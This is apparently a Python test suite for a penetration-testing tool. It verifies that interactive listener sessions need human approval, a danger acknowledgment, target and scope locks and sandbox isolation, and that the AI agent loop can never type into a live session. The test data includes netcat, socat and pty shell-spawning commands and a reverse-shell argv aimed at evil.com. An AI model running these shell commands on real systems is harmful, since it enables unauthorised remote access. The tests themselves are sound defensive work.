"""Live-session containment regression-lock (cockpit/session.py).

A session is a long-lived, already-approved, already-running process with an OPEN
STDIN. That makes it the highest-leverage thing in the cockpit, so two invariants carry
the whole safety model and these tests fail loudly if either is weakened:

  1. STARTING a session is a GATED COMMAND. start() must go through the REAL executor
     gates — approve-each + the heuristic red-confirm + the mode gate, argv-only. A
     listener (nc/socat/interpreter) trips the heuristic, so dangerous_ack is required.
     An unapproved, unacked, or off-target start runs NOTHING.

  2. A LIVE SESSION'S STDIN IS *** HUMAN-ONLY ***. write_stdin may be referenced ONLY by
     session.py (defines it) + cockpit/router.py (the HTTP route a human's UI drives).
     The orchestrator / agent / loop / executor / adgraph must have ZERO code path to
     it. This is the same rule :kali has, scanned the same way — and it matters more
     here: :kali needs a human to type each command, and so must a live session. The
     loop may PROPOSE starting a session (a gated command a human approves); it may
     NEVER type into one.

Also locked: the sandbox comes from the MODE (never a request field), containment is
whatever the start mode gives it (lab isolation / engagement scope-lock), the argv is
argv-only, and the transcript is recorded against the engagement.

Hermetic: subprocess.Popen, the isolation gate and runstore.save_run are monkeypatched,
so no Docker daemon and no real DB writes. Run:  python test_session.py
"""
from __future__ import annotations

import re
import threading
from pathlib import Path

from cockpit import config
from cockpit import executor as EX
from cockpit import session as S
from cockpit.session import SessionRefused, SessionStartRequest
from test_support import scans

BACKEND = Path(__file__).parent


class _FakeProc:
    """A stand-in for the docker exec client — records what was written to stdin."""

    def __init__(self, argv):
        self.argv = argv
        self.written: list[str] = []
        self._alive = True
        # A session is LONG-LIVED: wait() must block until killed, like the real client.
        self._done = threading.Event()
        outer = self

        class _In:
            closed = False

            def write(self, s):
                outer.written.append(s)

            def flush(self):
                pass

            def close(self):
                self.closed = True

        class _Out:
            def readline(self):
                return ""  # EOF immediately: no output pump churn in tests

            def close(self):
                pass

        self.stdin = _In()
        self.stdout = _Out()
        self.stderr = _Out()

    def wait(self):
        self._done.wait()
        return 0

    def poll(self):
        return None if self._alive else 0

    def kill(self):
        self._alive = False
        self._done.set()


class _Spy:
    """Swaps Popen, the isolation gate and save_run for fakes; restores on exit."""

    def __init__(self, *, isolated=True, docker_missing=False):
        self.isolated = isolated
        self.docker_missing = docker_missing
        self.procs: list[_FakeProc] = []
        self.saved: list = []
        self._orig = (S.subprocess.Popen, EX.assert_isolation_proven, S.runstore.save_run)

    def __enter__(self):
        def fake_popen(argv, **kw):
            if self.docker_missing:
                raise FileNotFoundError("docker")
            p = _FakeProc(argv)
            self.procs.append(p)
            return p

        def fake_isolation():
            if not self.isolated:
                from cockpit.sandbox import SandboxError

                raise SandboxError("sandbox is attached to non-internal network(s)")

        S.subprocess.Popen = fake_popen
        EX.assert_isolation_proven = fake_isolation
        S.runstore.save_run = lambda rec: self.saved.append(rec)
        return self

    def __exit__(self, *exc):
        S.subprocess.Popen, EX.assert_isolation_proven, S.runstore.save_run = self._orig
        # Don't leak fake sessions into the next test.
        with S._registry_lock:
            S._sessions.clear()
        return False


def _req(**over):
    base = dict(
        command="nc",
        args=["-lvnp", "4444"],
        target=config.LAB_TARGET_HOST,
        approved=True,
        dangerous_ack=True,
    )
    base.update(over)
    return SessionStartRequest(**base)


# --------------------------------------------------------------------------- #
# 1. STARTING a session is a GATED COMMAND.
# --------------------------------------------------------------------------- #


def test_start_requires_approval() -> None:
    """No approval -> nothing starts. There is no autonomous/approve-all path."""
    with _Spy() as spy:
        rejected = S.validate_start(_req(approved=False))
        assert rejected is not None and rejected.gate == "approval", rejected
        raised = False
        try:
            S.start(_req(approved=False))
        except SessionRefused as exc:
            raised = True
            assert exc.gate == "approval"
        assert raised, "an unapproved session start MUST refuse"
        assert not spy.procs, "a refused start MUST NOT spawn a process"
        assert not spy.saved, "a refused start MUST NOT be recorded"
    print("  start requires per-command human approval: PASS")


def test_start_trips_the_danger_heuristic() -> None:
    """A listener/handler is exactly what the heuristic flags — it needs dangerous_ack.

    This is the point: you cannot start a shell-catcher by accident, and neither can an
    agent-proposed command sneak one through on a plain approval.

    Runs inside _Spy() like every other gate test in this file, and it must. The LAB gate
    chain is target → approval → danger → ISOLATION, and that last gate calls the LIVE
    `assert_isolation_proven()` Docker probe. The un-acked half of each pair short-circuits
    at `danger` and never reaches it; the ACKED half falls all the way through, so on a host
    with the stack down it would come back gate="sandbox" and this test would fail for a
    reason that has nothing to do with the danger heuristic it is guarding. _Spy stubs that
    probe, which is what makes the assertion below test the danger gate and nothing else."""
    with _Spy():
        for cmd, args in [
            ("nc", ["-lvnp", "4444"]),
            ("ncat", ["-l", "-p", "4444", "-e", "/bin/sh"]),
            ("socat", ["TCP-LISTEN:4444,reuseaddr", "EXEC:/bin/sh"]),
            ("python3", ["-c", "import pty"]),
        ]:
            rejected = S.validate_start(_req(command=cmd, args=args, dangerous_ack=False))
            assert rejected is not None and rejected.gate == "danger", (
                f"{cmd} must require an explicit dangerous_ack, got {rejected}"
            )
            assert rejected.dangerous_flags, "the confirm must name why it was flagged"
            # With the ack it clears the danger gate.
            assert S.validate_start(_req(command=cmd, args=args)) is None, (
                f"{cmd} must start once explicitly acked"
            )

        # A `pty.spawn(...)` payload is caught by the DANGER gate (it names `pty`), which is
        # the correct control. It used to be refused earlier at the TARGET gate, but only
        # because the dotted token `pty.spawn(` was MISREAD as a foreign host — a false
        # positive that the step-12 host-check fix removes (the same fix stops rejecting
        # `directory-list-2.3-medium` and `Mozilla/5.0`). So without the ack it fails closed
        # at `danger`, not `target`:
        payload = ["-c", "import pty; pty.spawn('/bin/sh')"]
        rejected = S.validate_start(_req(command="python3", args=payload, dangerous_ack=False))
        assert rejected is not None and rejected.gate == "danger", (
            f"a pty payload must fail closed at the danger gate, got {rejected}"
        )
        # And with the explicit human ack it clears — an approved dangerous command in the
        # isolated lab, where isolation is the real bound. That is the intended model.
        assert S.validate_start(_req(command="python3", args=payload)) is None, (
            "an explicitly-acked pty payload must start in the isolated lab"
        )
    print("  start trips the heuristic red-confirm (nc/ncat/socat/interpreter): PASS")


def test_start_is_target_locked() -> None:
    """The DECLARED bind target is validated by the mode's real target-lock, and a bad
    host in the REAL args is still rejected even when the declared target is the lab."""
    rejected = S.validate_start(_req(target="evil.com"))
    assert rejected is not None and rejected.gate == "target", rejected
    assert "not the lab" in rejected.reason

    # The declared target cannot launder an off-lab host sitting in the argv.
    rejected = S.validate_start(_req(args=["-e", "/bin/sh", "evil.com", "4444"]))
    assert rejected is not None and rejected.gate == "target", (
        "a bad host in the args must still be rejected — the declared target is not a bypass"
    )
    print("  start is target-locked (declared target + args both checked): PASS")


def test_start_keeps_the_lab_isolation_gate() -> None:
    """LAB sessions still require a provably isolated sandbox — the lab's real bound."""
    with _Spy(isolated=False) as spy:
        rejected = S.validate_start(_req())
        assert rejected is not None and rejected.gate == "sandbox", rejected
        raised = False
        try:
            S.start(_req())
        except SessionRefused as exc:
            raised = True
            assert exc.gate == "sandbox"
        assert raised, "a non-isolated lab sandbox MUST refuse to host a session"
        assert not spy.procs, "nothing may spawn when isolation fails"
    print("  lab session keeps the isolation gate: PASS")


def test_sandbox_comes_from_mode_not_request() -> None:
    """No request field can redirect the exec (mirrors :kali containment rule #1)."""
    fields = set(SessionStartRequest.model_fields.keys())
    assert fields == {
        "command", "args", "target", "approved", "dangerous_ack",
        "engagement_id", "session_id", "step_id",
    }, f"unexpected SessionStartRequest fields {fields} — a container/sandbox field would break containment"
    assert "container" not in fields and "sandbox" not in fields

    with _Spy() as spy:
        # Even a command whose *string* names the open/engagement boxes execs into the lab one.
        S.start(_req(args=["-lvnp", "4444", "--x=hackpit-kali-open"], target=config.LAB_TARGET_HOST))
        argv = spy.procs[0].argv
        assert argv[:4] == ["docker", "exec", "-i", config.SANDBOX_CONTAINER], argv
        assert argv[3] != config.KALI_OPEN_CONTAINER, "a lab session must NOT reach the open box"
        assert argv[3] != config.ENGAGE_SANDBOX_CONTAINER, "a lab session must NOT reach engagement"
        # argv-only: never a shell, and the declared target is NOT appended to the argv.
        assert "sh" not in argv[3:5] and "-c" not in argv, "sessions are argv-only (no shell)"
        assert argv[4:] == ["nc", "-lvnp", "4444", "--x=hackpit-kali-open"], argv
    print("  sandbox comes from the MODE, argv-only, no container field: PASS")


# --------------------------------------------------------------------------- #
# 2. *** THE INVARIANT ***  — a live session's stdin is HUMAN-ONLY.
# --------------------------------------------------------------------------- #


def test_session_stdin_is_human_only() -> None:
    """write_stdin may be referenced ONLY by session.py + cockpit/router.py.

    THE LOAD-BEARING TEST. A live session is already approved and already running, so
    anything able to type into it is executing un-gated commands — that is exactly the
    autonomy the approve-each model exists to prevent. The orchestrator/agent/loop/
    executor/adgraph must have NO path here.

    IT SAID "the whole (non-venv) source tree" AND GLOBBED THREE DIRECTORIES — backend/,
    cockpit/ and adgraph/ — leaving arsenal/, codescan/, detection/, evasion/, exploits/ and
    state/ unopened. It had already fixed the basename half of the C3 defect (the allow-list is
    keyed by relative path, so adgraph/router.py is not exempt alongside cockpit/router.py) but
    not the coverage half. This lock was not in the build's task list; it was found by sweeping
    for the pattern rather than the named files, which is the only way the class stays closed.
    """
    allowed = {"cockpit/session.py", "cockpit/router.py"}
    # Import forms that would pull the live-session module in, plus the writer itself.
    # \bsession\b does not match `sessions` (backend/sessions.py, the engagement store).
    patterns = [
        r"\bwrite_stdin\b",
        r"\bfrom\s+\.session\b",
        r"\bfrom\s+cockpit\.session\b",
        r"\bimport\s+cockpit\.session\b",
        r"\bfrom\s+cockpit\s+import\s+[^\n]*\bsession\b",
        r"\bfrom\s+\.\s+import\s+[^\n]*\bsession\b",
        r"\bcockpit\.session\b",
    ]
    ast_targets = ["cockpit.session", "write_stdin"]
    res = scans.scan_source_tree(patterns=patterns, allowed=allowed, ast_targets=ast_targets)
    scans.assert_clean(
        res,
        what="a live session's stdin must be HUMAN-ONLY — the orchestrator/agent/executor must "
             "have NO path to session.write_stdin",
        must_have_scanned=["orchestrator.py", "adgraph/orchestrator.py", "cockpit/executor.py",
                           "detection/resolver.py", "evasion/engine.py", "state/store.py"],
        min_checked=60,
    )
    scans.assert_catches_a_planted_violation(
        plant="from cockpit.session import write_stdin",
        patterns=patterns, allowed=allowed, ast_targets=ast_targets,
        where="evasion/engine.py",
    )
    print(f"  session stdin is HUMAN-ONLY across all {len(res.checked)} backend modules "
          "(+ planted-violation control): PASS")


def test_agent_path_modules_expose_no_session_hook() -> None:
    """Belt-and-suspenders: the autonomous path's modules carry no session attribute."""
    import orchestrator as O

    for mod, name in ((EX, "executor"), (O, "orchestrator")):
        for attr in ("write_stdin", "session", "start_session", "SessionStartRequest"):
            assert not hasattr(mod, attr), (
                f"{name} must not expose '{attr}' — that would be an agent path to a live session"
            )
    # The orchestrator source must not reach sessions either (it only proposes commands).
    src = Path(O.__file__).read_text(encoding="utf-8")
    for bad in ("write_stdin", "session_start", "cockpit.session", "from .session"):
        assert bad not in src, f"orchestrator must not reference '{bad}'"
    print("  executor/orchestrator expose no session hook: PASS")


def test_loop_may_propose_a_session_but_cannot_drive_one() -> None:
    """The loop's ONLY relationship to sessions is proposing a command a human approves.

    A proposal is inert data — it carries no session id, cannot start a session, and has
    no route to stdin. Starting is a human's gated action; typing is a human's action.
    """
    import orchestrator as O

    plan = {"goal": "g", "phases": [{"phase": "recon", "label": "R", "steps": []}]}
    resp = (
        '{"done": false, "command": "nc", "args": ["-lvnp", "4444", "hackpit-lab-target"], '
        '"rationale": "catch a shell"}'
    )
    orig = O.llm.chat
    try:
        O.llm.chat = lambda system, user, cfg, max_tokens=700: resp
        out = O.propose_next(plan, [], {}, [])
    finally:
        O.llm.chat = orig

    proposal = out["proposal"]
    assert proposal is not None, "the loop may legitimately propose a listener"
    # The proposal is INERT DATA: it carries the command/args/rationale + advisory gate info
    # (and, since build #8, advisory REASONING fields — hypothesis/citations/critique/etc., which
    # are data, not capability). What matters for THIS invariant is the negative: it carries no
    # live-session id and no stdin payload, so there is nothing for it to drive. Asserting the
    # ABSENCE of session-driving keys is the real predicate — an exact whitelist would forbid
    # harmless advisory fields and break the moment the proposer got any richer.
    assert {"command", "args", "rationale", "step_id", "gate_ok", "gate_reason",
            "dangerous_flags"} <= set(proposal), sorted(proposal)
    forbidden = {"session_id", "session", "stdin", "start", "approve", "approved", "run",
                 "execute", "exec", "pid", "proc"}
    assert not (forbidden & set(proposal)), \
        f"a proposal must not gain session-driving fields, got {sorted(forbidden & set(proposal))}"
    assert proposal["dangerous_flags"], "a proposed listener must still be flagged dangerous"
    # And proposing it starts NOTHING — the registry is untouched.
    with S._registry_lock:
        assert not S._sessions, "a proposal must never create a session"
    print("  loop may propose a session-start, never drive a live session: PASS")


def test_stdin_refuses_when_session_is_not_live() -> None:
    """Writing to a finished session refuses — stdin only ever reaches a LIVE process."""
    with _Spy():
        info = S.start(_req())
        S.kill(info.sid)
        raised = False
        try:
            S.write_stdin(info.sid, "whoami")
        except SessionRefused as exc:
            raised = True
            assert exc.gate == "state"
        assert raised, "a killed session MUST refuse further input"

        missing = False
        try:
            S.write_stdin("deadbeefdead", "whoami")
        except S.SessionNotFound:
            missing = True
        assert missing, "an unknown sid must not resolve to some other session"
    print("  stdin refuses on a finished/unknown session: PASS")


def test_stdin_is_recorded_as_human_input() -> None:
    """What a human typed is marked in the transcript, distinct from process output."""
    with _Spy() as spy:
        info = S.start(_req(session_id="eng-1"))
        S.write_stdin(info.sid, "whoami")
        proc = spy.procs[0]
        assert proc.written == ["whoami\n"], f"the line must reach stdin verbatim, got {proc.written}"
        rec = spy.saved[-1]
        assert rec.command == "session", "the record must name itself a session"
        assert rec.args == ["nc", "-lvnp", "4444"], "the record logs the argv that started it"
        assert rec.session_id == "eng-1", "the transcript attaches to the engagement"
        assert S.STDIN_MARK + "whoami" in rec.stdout, "human input must be marked in the transcript"
    print("  human input is recorded + marked in the transcript: PASS")


def test_stdin_write_is_capped() -> None:
    """A paste bomb is refused rather than shoved into a live process."""
    with _Spy() as spy:
        info = S.start(_req())
        raised = False
        try:
            S.write_stdin(info.sid, "A" * (S.STDIN_MAX_BYTES + 10))
        except SessionRefused as exc:
            raised = True
            assert exc.gate == "limit"
        assert raised, "an oversized write must refuse"
        assert spy.procs[0].written == [], "nothing may reach stdin when the cap refuses"
    print("  stdin write is capped: PASS")


# --------------------------------------------------------------------------- #
# 3. CONTAINMENT — a session is bounded by the MODE it started in.
# --------------------------------------------------------------------------- #


def _patch_active(rec):
    """Make the executor resolve THIS engagement (or none), as test_engagement_mode does."""
    from cockpit import engagement as ENG

    orig = ENG.get_active
    ENG.get_active = lambda eid: rec if (rec and eid == rec.engagement_id) else None
    return lambda: setattr(ENG, "get_active", orig)


def _fake_engagement():
    from cockpit.models import EngagementRecord

    return EngagementRecord(
        engagement_id="eng-sess000000",
        target="scanme.nmap.org",
        authorization="authorized test target",
        active=True,
        entered_at="2026-07-25T00:00:00+00:00",
        scope="scanme.nmap.org",
        scope_include=["scanme.nmap.org"],
        allowed_hosts=["scanme.nmap.org"],
    )


def test_engagement_session_is_bounded_by_the_scope_lock() -> None:
    """An ENGAGEMENT session binds to the engagement sandbox and its authorized scope.

    In-scope target starts; out-of-scope is refused at the target gate. There is no
    isolation floor in engagement mode, so the scope-lock + approve-each are the bound.
    """
    eng = _fake_engagement()
    restore = _patch_active(eng)
    try:
        with _Spy(isolated=False) as spy:  # engagement has NO isolation floor by design
            in_scope = _req(target="scanme.nmap.org", engagement_id=eng.engagement_id)
            assert S.validate_start(in_scope) is None, "an in-scope engagement session must start"
            info = S.start(in_scope)
            assert info.mode == "engagement", info
            assert info.container == config.ENGAGE_SANDBOX_CONTAINER, info.container
            argv = spy.procs[0].argv
            assert argv[3] == config.ENGAGE_SANDBOX_CONTAINER, argv
            assert argv[3] != config.SANDBOX_CONTAINER, "must NOT reach the isolated lab box"
            assert argv[3] != config.KALI_OPEN_CONTAINER, "must NOT reach the :kali open box"

            # Out of scope -> refused at the SCOPE gate, nothing starts. The per-command exec loop
            # can override scope with a conscious tick, but a persistent SESSION cannot (its
            # start-request pins scope_override=False), so an off-scope shell stays hard-refused.
            out = _req(target="evil.com", engagement_id=eng.engagement_id)
            rejected = S.validate_start(out)
            assert rejected is not None and rejected.gate == "scope", rejected
            assert "scope" in rejected.reason.lower(), rejected.reason

            # An unknown/exited engagement is refused — never downgraded to lab.
            unknown = _req(target="scanme.nmap.org", engagement_id="eng-gone000000")
            rejected = S.validate_start(unknown)
            assert rejected is not None and rejected.gate == "engagement", rejected
    finally:
        restore()
    print("  engagement session is scope-locked to the engagement sandbox: PASS")


def test_engagement_session_still_needs_approval_and_ack() -> None:
    """No autonomy on a real target: approve-each + red-confirm hold for sessions too."""
    eng = _fake_engagement()
    restore = _patch_active(eng)
    try:
        with _Spy(isolated=False) as spy:
            r = S.validate_start(
                _req(target="scanme.nmap.org", engagement_id=eng.engagement_id, approved=False)
            )
            assert r is not None and r.gate == "approval", r
            r = S.validate_start(
                _req(
                    target="scanme.nmap.org",
                    engagement_id=eng.engagement_id,
                    dangerous_ack=False,
                )
            )
            assert r is not None and r.gate == "danger", r
            assert not spy.procs, "nothing may start while a gate refuses"
    finally:
        restore()
    print("  engagement session keeps approve-each + red-confirm: PASS")


def test_lab_mode_is_unchanged_by_sessions() -> None:
    """Sessions add NO new capability and change nothing about lab execution.

    The lab keeps its four gates and its isolated container; the session module reaches
    neither the :kali open box nor any shell, and one-shot lab runs are untouched.
    """
    from cockpit.models import ExecRequest

    # The lab one-shot path still resolves to the isolated sandbox with its gates intact.
    resolved = EX.resolve_mode(ExecRequest(command="nmap", args=["-sV", config.LAB_TARGET_HOST]))
    assert resolved.mode == "lab" and resolved.container == config.SANDBOX_CONTAINER
    assert resolved.engagement is None
    with _Spy(isolated=False):
        r = EX.validate_request(
            ExecRequest(
                command="nmap", args=["-sV", config.LAB_TARGET_HOST], approved=True
            )
        )
        assert r is not None and r.gate == "sandbox", "lab still fails closed without isolation"

    # The session module is not a shell and has no :kali path.
    src = Path(S.__file__).read_text(encoding="utf-8")
    for bad in ("run_kali", "from .kali", "cockpit.kali", 'KALI_OPEN_CONTAINER'):
        assert bad not in src, f"session.py must not reference '{bad}'"
    assert '"sh", "-c"' not in src and "'sh', '-c'" not in src, (
        "sessions are argv-only — session.py must never build a shell invocation"
    )
    # It execs into exactly the two mode containers, chosen by resolve_mode.
    assert "executor.resolve_mode" in src, "the container must come from the shared resolver"
    print("  lab mode unchanged; sessions add no new capability: PASS")


# --------------------------------------------------------------------------- #
# 4. RECORDING — the transcript lands in the report, tagged with its mode.
# --------------------------------------------------------------------------- #


def test_transcript_reaches_the_report_tagged_with_mode() -> None:
    """A session transcript is report evidence, tagged lab vs REAL-TARGET like other runs.

    It must also be marked as an INTERACTIVE SESSION: a reader must not mistake a
    hand-driven transcript for the output of one command.
    """
    import report

    with _Spy() as spy:
        info = S.start(_req(session_id="eng-report"))
        S.write_stdin(info.sid, "whoami")
        S.kill(info.sid)
        rec = spy.saved[-1].model_dump()

    # LAB session -> isolated-lab evidence, named as a session.
    md = report.build_evidence_section({"execution_runs": [rec]})
    assert "interactive session (isolated lab)" in md, md
    assert "REAL-TARGET" not in md, "a lab session must not be tagged real-target"
    # The `session` marker is dropped — the reader sees the real listener command line.
    assert "nc -lvnp 4444" in md and "session nc -lvnp" not in md, md
    assert "Session transcript" in md, "the block must be labelled a transcript"
    assert S.STDIN_MARK + "whoami" in md, "what the operator typed must appear verbatim"
    assert f"run-{info.run_id}" in md, "the transcript must be citable by run id"

    # ENGAGEMENT session -> called out as a real target, never blurred with lab evidence.
    eng_rec = {**rec, "mode": "engagement", "target": "app.example.com"}
    eng_md = report.build_evidence_section({"execution_runs": [eng_rec]})
    assert "REAL-TARGET ENGAGEMENT · interactive session" in eng_md, eng_md
    assert "isolated lab" not in eng_md, "a real-target session must not read as lab evidence"
    assert "target app.example.com" in eng_md

    # A one-shot command record is UNCHANGED by the session handling.
    plain = {**rec, "command": "nmap", "args": ["-sV", "hackpit-lab-target"]}
    plain_md = report.build_evidence_section({"execution_runs": [plain]})
    assert "sandbox execution (isolated lab)" in plain_md
    assert "nmap -sV hackpit-lab-target" in plain_md
    assert "interactive session" not in plain_md
    print("  transcript reaches the report, tagged with mode: PASS")


def test_transcript_is_capped() -> None:
    """A flooding session cannot blow up memory or the audit record."""
    with _Spy() as spy:
        info = S.start(_req())
        live = S._sessions[info.sid]
        live.emit({"type": "stdout", "line": "x"}, transcript_text="A" * (S.SESSION_TRANSCRIPT_CAP + 5000))
        text = live.transcript_text()
        assert len(text) <= S.SESSION_TRANSCRIPT_CAP + 64, "transcript must be capped"
        assert "truncated" in text, "truncation must be marked in the transcript"
        assert live.info.truncated is True, "the record must be flagged truncated"
        S.kill(info.sid)
        assert spy.saved, "a capped session is still recorded"
    print("  transcript is capped (no flood): PASS")


def test_reaper_kills_idle_and_overlong_sessions() -> None:
    """An unattended caught shell does not live forever."""
    import time as _t

    with _Spy():
        info = S.start(_req())
        live = S._sessions[info.sid]
        # Pretend the last I/O was long ago.
        live.last_io = _t.monotonic() - (S.SESSION_IDLE_TIMEOUT_SECONDS + 10)
        killed = S._reap_once()
        assert info.sid in killed, "an idle session must be reaped"
        assert S.get(info.sid).state == "killed"
        assert "idle" in S.get(info.sid).detail

        info2 = S.start(_req())
        live2 = S._sessions[info2.sid]
        live2.started_mono = _t.monotonic() - (S.SESSION_MAX_LIFETIME_SECONDS + 10)
        killed2 = S._reap_once()
        assert info2.sid in killed2, "a session past max lifetime must be reaped"
        assert "lifetime" in S.get(info2.sid).detail
    print("  reaper kills idle + overlong sessions: PASS")


def test_shutdown_kills_every_live_session() -> None:
    """Backend teardown never leaves a caught shell running."""
    with _Spy():
        a = S.start(_req())
        b = S.start(_req())
        S.shutdown_all()
        assert S.get(a.sid).state == "killed" and S.get(b.sid).state == "killed"
    print("  shutdown kills every live session: PASS")


if __name__ == "__main__":
    test_start_requires_approval()
    test_start_trips_the_danger_heuristic()
    test_start_is_target_locked()
    test_start_keeps_the_lab_isolation_gate()
    test_sandbox_comes_from_mode_not_request()
    test_session_stdin_is_human_only()
    test_agent_path_modules_expose_no_session_hook()
    test_loop_may_propose_a_session_but_cannot_drive_one()
    test_stdin_refuses_when_session_is_not_live()
    test_stdin_is_recorded_as_human_input()
    test_stdin_write_is_capped()
    test_engagement_session_is_bounded_by_the_scope_lock()
    test_engagement_session_still_needs_approval_and_ack()
    test_lab_mode_is_unchanged_by_sessions()
    test_transcript_reaches_the_report_tagged_with_mode()
    test_transcript_is_capped()
    test_reaper_kills_idle_and_overlong_sessions()
    test_shutdown_kills_every_live_session()
    print("ALL live-session containment tests pass")
